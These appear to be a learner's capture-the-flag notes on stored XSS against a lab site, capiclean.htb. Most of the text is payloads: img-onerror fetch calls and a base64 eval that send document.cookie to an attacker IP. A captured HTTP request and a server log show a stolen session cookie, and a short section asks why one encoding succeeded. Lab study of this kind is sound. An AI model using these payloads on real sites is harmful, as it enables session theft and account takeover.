
```

```





payload at the endpoint POST `/sendMessage`
```js
<img+src=x+onerror=fetch("http://<ATTACK_IP>/"+document.cookie)>
```

```python
 <img+src=x+onerror=eval(atob('Javascript payload in base64'));/> 
```

```js
service=<img+src=x+onerror=fetch("http://10.10.14.4:1234/"+document.cookie)>&email=a%40a.com
```

```
kali@kali ~> http 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.10.11.12 - - [12/Apr/2024 17:56:00] "GET / HTTP/1.1" 200 -
10.10.11.12 - - [12/Apr/2024 17:56:00] code 404, message File not found
10.10.11.12 - - [12/Apr/2024 17:56:00] "GET /favicon.ico HTTP/1.1" 404 -
10.10.11.12 - - [12/Apr/2024 17:58:18] "GET / HTTP/1.1" 200 -
10.10.11.12 - - [12/Apr/2024 17:58:21] code 404, message File not found
10.10.11.12 - - [12/Apr/2024 17:58:21] "GET /temp.js HTTP/1.1" 404 -
10.10.11.12 - - [12/Apr/2024 18:01:58] code 404, message File not found
10.10.11.12 - - [12/Apr/2024 18:01:58] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zhkjlw.VpHJwdDj234g40_I_doW7MdKOWs HTTP/1.1" 404 -

```


```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 125
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate, br
Connection: close


service=<img+src=x+onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC45Ojk5OTkvJytkb2N1bWVudC5jb29raWUp'));+/>&email=a%40a.com
```


```
```



---

# Mistakes

this means my input is being *seen* by someone. with this difficulty this means that the other end is going to see it
`Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services.`



why did this work?

`service=<img+src%3dx+onerror%3dfetch("http%3a//10.10.14.9:9999/"%2bdocument.cookie)>&email=test.test%40mc.it`  is `service=<img src=x onerror=fetch("http://10.10.14.9:9999/"+document.cookie)>&email=test.test@mc.it`

But everything else didnt


